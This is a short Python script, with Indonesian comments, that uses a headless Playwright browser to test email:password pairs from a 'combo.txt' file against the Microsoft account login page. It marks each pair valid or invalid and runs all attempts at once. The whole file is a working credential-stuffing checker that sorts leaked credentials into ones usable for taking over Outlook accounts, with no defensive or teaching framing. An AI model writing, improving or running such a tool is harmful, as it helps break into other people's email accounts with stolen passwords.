import asyncio
from playwright.async_api import async_playwright

async def login_outlook(email, password):
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            page = await context.new_page()

            await page.goto("https://login.live.com/")
            await page.fill('input[type="email"]', email)
            await page.click('input[type="submit"]')

            await page.wait_for_timeout(2000)  # Tunggu halaman password muncul
            await page.fill('input[type="password"]', password)
            await page.click('input[type="submit"]')

            await page.wait_for_timeout(5000)  # Tunggu respon

            if "login.live.com" not in page.url:
                print(f"[VALID] {email}:{password}")
            else:
                print(f"[INVALID] {email}:{password}")

            await browser.close()
    except Exception as e:
        print(f"[ERROR] {email}:{password} -> {str(e)}")

async def main():
    tasks = []
    with open("combo.txt", "r") as f:
        for line in f:
            if ':' in line:
                email, password = line.strip().split(":", 1)
                tasks.append(login_outlook(email, password))
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
